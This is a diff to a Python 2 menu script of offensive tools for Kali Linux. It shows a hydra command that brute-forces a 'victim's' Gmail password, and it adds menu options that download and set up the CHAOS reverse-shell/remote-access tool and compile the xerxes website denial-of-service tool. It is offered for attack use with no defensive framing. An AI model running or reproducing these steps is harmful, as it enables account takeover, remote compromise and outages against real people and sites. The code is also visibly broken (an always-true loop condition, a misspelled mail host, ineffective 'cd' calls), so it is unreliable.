@@ -6,9 +6,10 @@ def choose():
    print "2. Fully Update Kali"
    print "3. Genarate Password List"
    print "4. Crack Gmail Password"
-   print "5. Creat a Revearse Shell for Windows"
+   print "5. Create a Revearse Shell With CHAOS"
+   print "6. DOS Website Attack"
 option = input(">")
-while option != 1 or 2 or 3 or 4 or 5:
+while option != 1 or 2 or 3 or 4 or 5 or 6:
   print"INVALID OPTION"
   choose()
  if option == 1:
@@ -85,4 +86,15 @@ if option == 4:
    lc = raw_input("File Location of Password List: ")
    os.system('hydra -S -l '+victim+' -P '+lc+' -v -V -e ns -s 465 stmp.gmail.com stmp')
 if option == 5:
+   os.system('cd')
+   os.system('git clone https://github.com/tiagorlampert/CHAOS')
+   os.system('apt-get install golang upx-ucl -y')
+   os.system('cd')
+   os.system('cd CHAOS')
+if option == 6:
+   os.system('cd')
+   os.system('git clone https://github.com/zanyarjamal/xerxes')
+   os.system('cd xerxes')
+   os.system('gcc xerxes.c -o xerxes')
+                 
                  
